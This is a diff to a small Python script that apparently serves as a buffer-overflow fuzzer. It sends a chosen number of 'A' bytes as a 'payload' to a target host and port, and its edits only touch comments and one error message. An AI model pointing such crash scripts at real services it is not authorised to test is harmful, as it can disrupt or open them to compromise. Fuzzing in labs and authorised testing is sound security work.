@@ -11,6 +11,8 @@ from optparse import OptionParser
 # defs --
 def send():
     """ send payload -- """
+
+    # args --
     port = int(options.port)
     target = str(options.target)
     buffer = str(options.buffer)
@@ -18,7 +20,7 @@ def send():
     try:
         print('[+] sending payload')
 
-        """ assemble temp sc -- """
+        # send junk --
         buffer = b"A" * int(buffer)
 
         """ send payload -- """
@@ -35,7 +37,6 @@ def send():
         print('[+] done')
 
     except socket.error as e:
-        print('[!] connection failed')
         print('[!] socket error: %s' % e)
         sys.exit(-1)
 
